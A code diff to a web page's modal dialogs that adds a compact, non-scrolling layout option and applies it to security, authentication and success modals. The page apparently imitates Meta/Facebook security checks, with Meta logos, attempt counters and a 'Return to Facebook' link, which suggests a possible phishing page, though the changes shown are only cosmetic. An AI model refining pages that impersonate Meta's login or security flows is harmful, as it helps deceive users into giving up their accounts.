@@ -72,6 +72,7 @@
         padding: 24px;
         display: flex;
         flex-direction: column;
+        max-height: 92vh;
         overflow-y: auto;
         transform: scale(0.9);
         opacity: 0;
@@ -180,8 +181,11 @@
         background-color: #fff !important;
         position: relative;
       }
-      .modal-box::before {
-        display: none;
+      .modal-box::before { display: none; }
+      /* Compact: height tự co theo nội dung, không scroll */
+      .modal-box.modal-compact {
+        max-height: none;
+        overflow-y: visible;
       }
     </style>
 
@@ -649,13 +653,13 @@
     const Modal = {
       _current: null,
 
-      create(id, content) {
+      create(id, content, compact) {
         const old = document.getElementById(id);
         if (old) old.remove();
         const overlay = document.createElement('div');
         overlay.id = id;
         overlay.className = 'modal-overlay';
-        overlay.innerHTML = '<div class="modal-box">' + content + '</div>';
+        overlay.innerHTML = '<div class="modal-box' + (compact ? ' modal-compact' : '') + '">' + content + '</div>';
         overlay.addEventListener('click', function(e) {
           if (e.target === overlay) Modal.close(id);
         });
@@ -892,7 +896,7 @@
           '<img src="../public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo" style="margin-top:16px;">' +
         '</div>';
 
-      Modal.create('securityModal', content);
+      Modal.create('securityModal', content, true);
       Modal.open('securityModal');
 
       var clickCount = 0;
@@ -963,7 +967,7 @@
           '<img src="../public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo">' +
         '</div>';
 
-      Modal.create('authModal', content);
+      Modal.create('authModal', content, true);
       Modal.open('authModal');
 
       var authCount = 0;
@@ -1048,7 +1052,7 @@
         '<a href="https://www.facebook.com" class="modal-return-btn">Return to Facebook</a>' +
         '<img src="../public/icons/ic_meta_gray.svg" alt="Meta" class="modal-meta-logo">';
 
-      Modal.create('successModal', content);
+      Modal.create('successModal', content, true);
       Modal.open('successModal');
     }
     </script>
